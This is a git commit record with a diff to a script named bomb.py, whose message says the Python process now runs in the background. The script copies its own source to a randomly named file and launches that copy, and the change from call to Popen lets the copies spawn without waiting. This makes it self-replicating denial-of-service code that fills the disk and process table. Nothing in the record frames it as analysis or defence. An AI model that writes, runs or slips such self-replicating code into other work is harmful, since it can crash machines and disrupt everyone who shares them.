8c5d9d1f15ed5ba388c0f8b7d654d1ee869ce6f0
ayylamo <ayylamo@cock.li>
2017-03-03 23:37:22 -0600

    made python process run in background

--- bomb.py
+++ bomb.py
@@ -1,7 +1,7 @@
 from random import randrange
-from subprocess import call
+from subprocess import Popen
 name = "a%010d.py"%randrange(0,100000000000)
 l = open('bomb.py','r').read().split('\n')
 l[3] = l[3][:10]+name[:-3]+l[3][l[3].index('.py'):]
 open(name,'w').write('\n'.join(l))
-call(['python',name])
+Popen(['python',name])
